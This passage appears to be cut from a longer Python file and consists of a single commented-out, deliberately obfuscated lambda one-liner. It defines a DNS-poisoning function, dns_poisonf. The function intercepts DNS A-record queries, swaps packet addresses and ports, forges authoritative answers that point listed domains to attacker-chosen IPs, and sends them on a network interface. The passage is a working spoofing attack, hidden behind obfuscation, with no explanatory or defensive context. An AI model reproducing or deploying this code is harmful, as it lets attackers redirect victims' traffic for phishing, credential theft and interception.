...
# (lambda __g: [None for __g['dns_poisonf'], dns_poisonf.__name__ in [(lambda pkt: (lambda __l: [(lambda __after: None if ((not __l['pkt'].haslayer(DNS)) or (not __l['pkt'].haslayer(UDP)) or (not __l['pkt'].haslayer(IP)) or (not __l['pkt'].haslayer(Ether))) else __after())(lambda: (lambda __after: None if ((__l['pkt'][DNS].qr != 0) or (__l['pkt'][DNS].qd.qtype != 1)) else __after())(lambda: [[(lambda __after: None if (__l['domain'] not in poison_ips) else __after())(lambda: (delattr(__l['pkt'][IP], 'len'), (delattr(__l['pkt'][IP], 'chksum'), (delattr(__l['pkt'][UDP], 'len'), (delattr(__l['pkt'][UDP], 'chksum'), [[[[[[[(sendp(__l['pkt'], iface=interface, verbose=0), None)[1] for __l['pkt'][DNS].ancount in [(1)]][0] for __l['pkt'][DNS].an in [(DNSRR(rrname=__l['qname'], type='A', ttl=30, rdata=poison_ips[__l['domain']]))]][0] for __l['pkt'][DNS].aa in [(1)]][0] for __l['pkt'][DNS].qr in [(1)]][0] for (__l['pkt'][UDP].sport, __l['pkt'][UDP].dport) in [((__l['pkt'][UDP].dport, __l['pkt'][UDP].sport))]][0] for (__l['pkt'][IP].src, __l['pkt'][IP].dst) in [((__l['pkt'][IP].dst, __l['pkt'][IP].src))]][0] for (__l['pkt'][Ether].src, __l['pkt'][Ether].dst) in [((__l['pkt'][Ether].dst, __l['pkt'][Ether].src))]][0])[-1])[-1])[-1])[-1]) for __l['domain'] in [(__l['qname'][:-1].decode('utf-8'))]][0] for __l['qname'] in [(__l['pkt'][DNS].qd.qname)]][0])) for __l['pkt'] in [(pkt)]][0])({}), 'dns_poisonf')]][0])(globals())
